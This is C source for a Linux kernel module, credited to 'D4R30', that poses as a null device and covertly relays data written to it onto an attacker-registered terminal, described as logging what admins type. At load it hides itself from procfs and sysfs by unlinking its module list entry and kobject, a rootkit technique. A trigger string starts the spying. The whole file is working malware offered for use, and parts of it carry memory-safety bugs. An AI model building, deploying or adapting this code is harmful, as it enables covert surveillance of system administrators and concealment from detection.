/* Fake Null Driver. Written by Darcy(D4R30@protonmail.com)
 * Github: github.com/D4R30
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/kdev_t.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/moduleparam.h>
#include <linux/kthread.h>
#include <linux/tty.h>

#define dev_name "nulldriver"
#define start_spy "wherethehellareyou"
#define stop_spy "stopwriting"
#define BUF_SIZE 50000

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Fake null pointer that can log everything you write on admins tty.");

static int debugmod;
static int OpenN;
static int major_num;
static dev_t current_minor;

//static char data[BUF_SIZE];
static void *data = NULL;
static void *command = NULL;
static struct tty_struct *curtty = NULL;
static struct tty_struct *auth_curtty = NULL;

static int startpoint(void);
static void endpoint(void);
static void write_cur_tty(struct tty_struct *, void **,int);

module_param(debugmod , int , 0);
module_param(major_num , int, 0);

static int dev_getrid(struct inode *, struct file *);
static int dev_open(struct inode * , struct file *);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char * , size_t, loff_t *);

static struct file_operations fops = {
	.read = dev_read,
	.write = dev_write,
	.release = dev_getrid,
	.open = dev_open
};

static int dev_open(struct inode *nod, struct file *filp){

	try_module_get(THIS_MODULE);

	current_minor = MINOR(nod->i_rdev);

	if(debugmod)
		printk(KERN_INFO "NULL_MOD: Open is called. Specials file minor is %d\n" , current_minor);

	++OpenN;
	return 0;
}
static ssize_t dev_read(struct file *filp, char *buf, size_t len, loff_t *offset){return 0;}

static ssize_t dev_write(struct file *filp , const char *buf , size_t len , loff_t *offset){

	char msguser[200];
	size_t wrote_bytes = 0;
	int i = 0;
	char tmpch;
	if(debugmod)
		printk(KERN_ALERT "NULL MOD: Received commands from special file with minor %d: \n" , current_minor);

  if(len > BUF_SIZE){
    data = (void *)kmalloc(BUF_SIZE, GFP_KERNEL);
  }else{
    data = (void *)kmalloc(len+3, GFP_KERNEL);
  }

	do{
		get_user(tmpch, buf + i);
		*(char *)(data + i) = tmpch;
		wrote_bytes++;
		i++;
	}while(tmpch != '\0' && i < len && i < BUF_SIZE);

	if(len == strlen(start_spy) && strcmp((char *)data , start_spy) == 0){
		sprintf(msguser, "GOT IT. YOU CAN NOW READ THOSE BASTARDS COMMANDS!\r\n");
		command = msguser;
		curtty = get_current_tty();
		write_cur_tty(curtty, &command,40);
		goto exit;
	}
	if(len == strlen(stop_spy) && strcmp((char *)data, stop_spy) == 0){
    auth_curtty = get_current_tty();
    if(auth_curtty == curtty){
		  curtty = NULL;
      goto exit;
    }
	}

	strcat((char *)data, "\r\n");

  sprintf(msguser, "\r\n-----New entries-----\r\n");
  command = msguser;
  write_cur_tty(curtty, &command , 40);
	// An importent stage is here. Setting up the pointer to the entered data for admin when file is tapped.
	write_cur_tty(curtty, &data,20);
exit:
  kfree(data);
	return wrote_bytes;
}
static int dev_getrid(struct inode *nod , struct file *filp){
	module_put(THIS_MODULE);
	if(OpenN > 0)
		--OpenN;

	return 0;
}

void write_cur_tty(struct tty_struct *thetty, void **command,int sleeptime){
	if(thetty != NULL){
		int i=0;
		unsigned char temp[1];
		do{
			temp[0] = *(char *)(*command + i);
			temp[sizeof(temp)] = '\0';
			(*thetty->driver->ops->write)(thetty, temp , sizeof(temp));
			msleep(sleeptime);
			i++;

		}while(i < strlen(*command));
	}
}

static int startpoint(void){
	int register_res;
	// Getting the module disappeared from procfs and sysfs.

	list_del(&THIS_MODULE->list);
  if(debugmod)
	  printk("Deleted module from procfs.\n");
	kobject_del(&THIS_MODULE->mkobj.kobj);
  if(debugmod)
	  printk("Deleted from sysfs.\n");
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;


	if(debugmod)
		printk("NULL MOD: Starting the fake NULL driver module.\n");

	if((register_res = register_chrdev(major_num, dev_name, &fops)) > 0 && major_num == 0){
		major_num = register_res;
		if(debugmod)
			printk("NULL MOD: Successfully registered the char device %s with major number: %d\n" , dev_name , major_num);

	}else if(major_num != 0 && register_res == 0){
		if(debugmod)
			printk("NULL MOD: Successfully registered the char device %s with major number: %d\n" , dev_name , major_num);
	}else{
		if(debugmod)
			printk("NULL MOD: Problem in registering the char device %s. Return is: %d\n" , dev_name , register_res);
	}
	return 0;

}
static void endpoint(void){
	unregister_chrdev(major_num , dev_name);

	return;
}
MODULE_AUTHOR("D4R30");

module_init(startpoint);
module_exit(endpoint);
